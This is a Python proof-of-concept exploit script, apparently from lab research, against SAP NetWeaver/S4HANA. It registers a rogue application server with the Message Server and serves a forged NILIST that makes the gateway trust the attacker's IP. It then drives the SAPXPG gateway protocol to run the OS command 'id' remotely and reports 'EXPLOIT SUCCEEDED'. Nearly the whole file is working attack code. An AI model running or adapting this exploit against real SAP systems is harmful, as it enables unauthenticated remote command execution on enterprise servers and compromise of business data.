#!/usr/bin/env python3
"""
test_reuseport_nilist.py — Test theory: SAP GW connects to our MS-connection
SOURCE PORT for NILIST (the port shown in SMMS), NOT our NILIST reply port.

Fix: use SO_REUSEPORT so the MS connection binds to the same port as our
NILIST listener.  SMMS then shows that port, and GW connects to it.

Steps:
1. Start NILIST listener on FIXED_PORT with SO_REUSEPORT
2. Connect to MS FROM FIXED_PORT (SO_REUSEPORT + bind)
3. Do full betrusted registration
4. Reply to AD_GET_NILIST_PORT with FIXED_PORT (also advertised for pull model)
5. GW connects to 192.168.2.210:FIXED_PORT → serve NILIST → SAPXPG
"""

import sys, socket, struct, time, threading, random, string
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

from sap_ms_betrusted import (
    pkt_login_2, pkt_mod_state, pkt_logout,
    build_dp_info, ms_parse_header, build_nilist_port_reply,
    ni_send, ni_recv, ni_try_recv,
    DP_VERSION_V13, FLAG_ONE_WAY, FLAG_REQUEST, IFLAG_SEND_NAME,
    MSG_DIA, MSG_DIA_ENQ, ADM_GET_NILIST_PORT, _ADM_EYE, _ADM_HDR_LEN,
    _ADM_REC_SIZE, _HEADER_LEN,
)
from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    parse_response, ni_send as gw_send, ni_recv as gw_recv, ni_drain,
    hexdump, extract_p4_output,
)

MS_HOST   = '192.168.2.209'
MS_PORT   = 3901
GW_HOST   = '192.168.2.209'
GW_PORT   = 3300
ATT_IP    = '192.168.2.210'
SID       = 'S4H'
INST      = 0
HOSTNAME  = 's4hanadev'
KERNEL    = '793_REL'
DEST      = 'T_75'
CLIENT    = '000'
COMMAND   = 'id'
TIMEOUT   = 20

# Fixed port we bind the MS connection FROM, and serve NILIST ON
# SMMS will show this port — same port GW will try to connect to
FIXED_PORT = 33200

# ---------------------------------------------------------------------------
# NILIST listener (accepts on FIXED_PORT)
# ---------------------------------------------------------------------------

def _serve_nilist(srv_sock: socket.socket, attacker_ip: str) -> None:
    """Accept one connection on srv_sock and serve NILIST data."""
    srv_sock.settimeout(180)
    try:
        conn, addr = srv_sock.accept()
        print(f"[+] NILIST connection from {addr[0]}:{addr[1]} on port {FIXED_PORT}!")
        conn.settimeout(5)
        try:
            req = conn.recv(1024)
            if req:
                print(f"[*] NILIST request data ({len(req)}B): {req[:32].hex()}")
        except (socket.timeout, OSError):
            pass

        hostname_bytes = attacker_ip.replace(".", "-").encode("ascii")
        entry  = struct.pack("!I", 1)
        entry += struct.pack("!I", 0)
        entry += struct.pack("!I", 0)
        entry += socket.inet_aton("0.0.255.255")
        entry += socket.inet_aton(attacker_ip)
        entry += struct.pack("!I", 0)
        entry += b"\x00\x00\x0c\xe5"
        entry += hostname_bytes.ljust(70, b"\x00")[:70]
        entry += b" "
        ni_frame = struct.pack("!I", len(entry)) + entry
        conn.sendall(ni_frame)
        print(f"[+] NILIST served: {attacker_ip}/0.0.255.255 ({len(entry)}B)")
        conn.settimeout(10)
        try:
            while True:
                tail = conn.recv(256)
                if not tail:
                    break
                print(f"[*] NILIST tail: {tail[:32].hex()}")
        except (socket.timeout, OSError):
            pass
        conn.close()
    except socket.timeout:
        print(f"[!] NILIST: nobody connected on port {FIXED_PORT} within 180s")
    except Exception as e:
        print(f"[!] NILIST error: {e}")
    finally:
        srv_sock.close()


def start_nilist_listener() -> socket.socket:
    """Bind NILIST listener on FIXED_PORT with SO_REUSEPORT."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    srv.bind(("0.0.0.0", FIXED_PORT))
    srv.listen(1)
    print(f"[*] NILIST listener bound on 0.0.0.0:{FIXED_PORT} (SO_REUSEPORT)")
    t = threading.Thread(target=_serve_nilist, args=(srv, ATT_IP), daemon=True,
                         name="nilist-reuseport")
    t.start()
    return srv


# ---------------------------------------------------------------------------
# SAPXPG
# ---------------------------------------------------------------------------

def run_sapxpg() -> bool:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.connect((GW_HOST, GW_PORT))
    except socket.error as e:
        print(f"  [XPG] connect failed: {e}"); return False
    local_ip = sock.getsockname()[0]
    gw_send(sock, build_p1(GW_HOST, str(INST).zfill(2)))
    try:
        resp = gw_recv(sock, TIMEOUT); frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print("  [XPG] P1 timeout"); sock.close(); return False
    for f in frames:
        if parse_response(f)["error"]:
            print("  [XPG] P1 rejected"); sock.close(); return False

    p2 = build_p2(GW_HOST, DEST, local_ip=local_ip, target_hostname=HOSTNAME)
    gw_send(sock, p2)
    conv_id = None; gw_id = 0
    try:
        resp = gw_recv(sock, TIMEOUT); frames = [resp] + ni_drain(sock, 1)
        for f in frames:
            info = parse_response(f)
            if info["error"]:
                print(f"  [XPG] P2 err: {info.get('error_msg','')}"); sock.close(); return False
            if info["conv_id"] and not conv_id: conv_id = info["conv_id"]
            if info.get("gw_id") is not None: gw_id = info["gw_id"]
    except socket.timeout:
        print("  [XPG] P2 timeout"); sock.close(); return False
    if not conv_id:
        print("  [XPG] P2: no conv_id"); sock.close(); return False
    print(f"  [XPG] P2 OK conv_id={conv_id}")

    p3 = build_p3(conv_id, GW_HOST, HOSTNAME, SID, str(INST).zfill(2),
                  KERNEL, DEST, CLIENT, COMMAND, '', gw_id=gw_id)
    gw_send(sock, p3)
    try:
        resp = gw_recv(sock, TIMEOUT); frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print("  [XPG] P3 timeout"); sock.close(); return False
    for f in frames:
        info = parse_response(f)
        if info["error"]:
            print(f"  [XPG] P3 error: {info.get('error_msg','')}"); sock.close(); return False
        lines = extract_p4_output(f)
        if lines:
            print("  [XPG] *** COMMAND OUTPUT ***")
            for ln in lines: print(f"    {ln}")
            sock.close(); return True

    p4 = build_p4(conv_id, GW_HOST, HOSTNAME, SID, str(INST).zfill(2),
                  KERNEL, DEST, CLIENT, gw_id=gw_id)
    gw_send(sock, p4)
    try:
        resp = gw_recv(sock, TIMEOUT); info = parse_response(resp)
        if info["error"]:
            print(f"  [XPG] P4 error: {info.get('error_msg','')}"); sock.close(); return False
        out = extract_p4_output(resp)
        if out:
            print("  [XPG] *** COMMAND OUTPUT ***")
            for ln in out: print(f"    {ln}")
            sock.close(); return True
        print("  [XPG] P4: no output")
    except socket.timeout:
        print("  [XPG] P4 timeout")
    sock.close(); return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("=" * 70)
    print(f" NILIST SO_REUSEPORT test — MS connection FROM port {FIXED_PORT}")
    print(f" Same port as NILIST listener → SMMS port = NILIST port")
    print("=" * 70)

    # Step 1: Start NILIST listener on FIXED_PORT with SO_REUSEPORT
    start_nilist_listener()
    time.sleep(0.2)

    # Step 2: Connect to MS FROM FIXED_PORT (SO_REUSEPORT + bind)
    suffix = ''.join(random.choices('0123456789abcdef', k=4))
    our_name = f'192_168_2_210_{SID}_{str(INST).zfill(2)}_{suffix}'
    print(f"[*] Connecting to MS from port {FIXED_PORT}...")
    print(f"[*] Server name: {our_name!r}")

    ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ms.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ms.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    ms.bind((ATT_IP, FIXED_PORT))  # <-- bind to FIXED_PORT before connect
    ms.settimeout(15)
    ms.connect((MS_HOST, MS_PORT))

    local_src = ms.getsockname()
    print(f"[*] MS connection: {local_src} → {MS_HOST}:{MS_PORT}")
    print(f"[*] SMMS will show port {local_src[1]} for our server")

    # LOGIN_2
    ni_send(ms, pkt_login_2(our_name, diag_port=FIXED_PORT))
    resp = ni_recv(ms, 10)
    hdr = ms_parse_header(resp)
    key = hdr.get("key", b'\x00' * 8)
    print(f"[+] Logged in, key={key.hex()}")

    # MOD_STATE START + ACTIVE
    dp = build_dp_info(our_name, INST, DP_VERSION_V13, ATT_IP)
    ni_send(ms, pkt_mod_state(our_name, key, MSG_DIA_ENQ, dp))
    ni_try_recv(ms, 3)
    ni_send(ms, pkt_mod_state(our_name, key, MSG_DIA, dp))
    ni_try_recv(ms, 3)
    print(f"[+] Registration complete — {ATT_IP} in MS server table")
    print(f"[*] Check SMMS now — our server should show port {FIXED_PORT}")

    # Step 3: Wait for AD_GET_NILIST_PORT and reply with FIXED_PORT
    print(f"[*] Waiting for AD_GET_NILIST_PORT (up to 600s)...")
    ms.settimeout(600)
    nilist_replied = False
    xpg_done = False
    t_start = time.time()

    while time.time() - t_start < 600:
        try:
            pkt = ni_recv(ms, 30)
        except socket.timeout:
            # Try SAPXPG periodically even without NILIST confirmation
            elapsed = int(time.time() - t_start)
            if elapsed > 0 and elapsed % 60 == 0:
                print(f"[*] t={elapsed}s: trying SAPXPG...")
                if run_sapxpg():
                    print(f"\n[!!!] EXPLOIT SUCCEEDED at t={elapsed}s!")
                    xpg_done = True
                    break
            continue
        except Exception as e:
            print(f"[!] MS recv error: {e}")
            break

        if len(pkt) < _HEADER_LEN:
            continue

        hdr2 = ms_parse_header(pkt)
        if not hdr2:
            continue

        flag = hdr2.get("flag", -1)

        # Scan for ADM eye-catcher
        adm_pos = pkt.find(_ADM_EYE, _HEADER_LEN)
        if adm_pos >= 0:
            adm = pkt[adm_pos:]
            if len(adm) >= _ADM_HDR_LEN + 1:
                opcode = adm[_ADM_HDR_LEN]
                if opcode == ADM_GET_NILIST_PORT:
                    push_port = 0
                    if len(adm) >= _ADM_HDR_LEN + _ADM_REC_SIZE:
                        rec = adm[_ADM_HDR_LEN:_ADM_HDR_LEN + _ADM_REC_SIZE]
                        body = rec[3:]
                        push_port = struct.unpack("!H", body[:2])[0]

                    requestor = hdr2.get("fromname", "")
                    print(f"[*] AD_GET_NILIST_PORT from {requestor!r} "
                          f"push_port={push_port} flag={flag:#04x}")

                    if push_port > 1023:
                        # PUSH: GW is listening, connect to it
                        print(f"[*] PUSH mode — GW listening on {MS_HOST}:{push_port}, connecting...")
                        def _push():
                            try:
                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                s.settimeout(10)
                                s.connect((MS_HOST, push_port))
                                hostname_bytes = ATT_IP.replace(".", "-").encode("ascii")
                                entry  = struct.pack("!I", 1)
                                entry += struct.pack("!I", 0)
                                entry += struct.pack("!I", 0)
                                entry += socket.inet_aton("0.0.255.255")
                                entry += socket.inet_aton(ATT_IP)
                                entry += struct.pack("!I", 0)
                                entry += b"\x00\x00\x0c\xe5"
                                entry += hostname_bytes.ljust(70, b"\x00")[:70]
                                entry += b" "
                                s.sendall(struct.pack("!I", len(entry)) + entry)
                                print(f"[+] PUSH NILIST sent to {MS_HOST}:{push_port}")
                                s.close()
                            except Exception as e:
                                print(f"[!] PUSH failed: {e}")
                        threading.Thread(target=_push, daemon=True).start()
                    else:
                        # PULL: reply with FIXED_PORT (same as our MS source port)
                        print(f"[*] PULL mode — replying with port={FIXED_PORT} ip={ATT_IP}")
                        reply = build_nilist_port_reply(
                            our_name, key,
                            nilist_port=FIXED_PORT,
                            toname=requestor,
                            iflag=IFLAG_SEND_NAME,
                            attacker_ip=ATT_IP,
                        )
                        ni_send(ms, reply)
                        nilist_replied = True

        # Try SAPXPG every 30s after first nilist reply
        elapsed = int(time.time() - t_start)
        if nilist_replied and elapsed > 0 and elapsed % 30 == 0:
            print(f"[*] t={elapsed}s: trying SAPXPG...")
            if run_sapxpg():
                print(f"\n[!!!] EXPLOIT SUCCEEDED at t={elapsed}s!")
                xpg_done = True
                break

    ms.close()
    if not xpg_done:
        print("\n[*] Test complete — SAPXPG did not succeed.")
        print(f"[*] If SMMS showed port {FIXED_PORT}, theory is confirmed but NILIST format wrong.")
        print(f"[*] If SMMS showed a different port, TCP source port theory is wrong.")


if __name__ == '__main__':
    main()
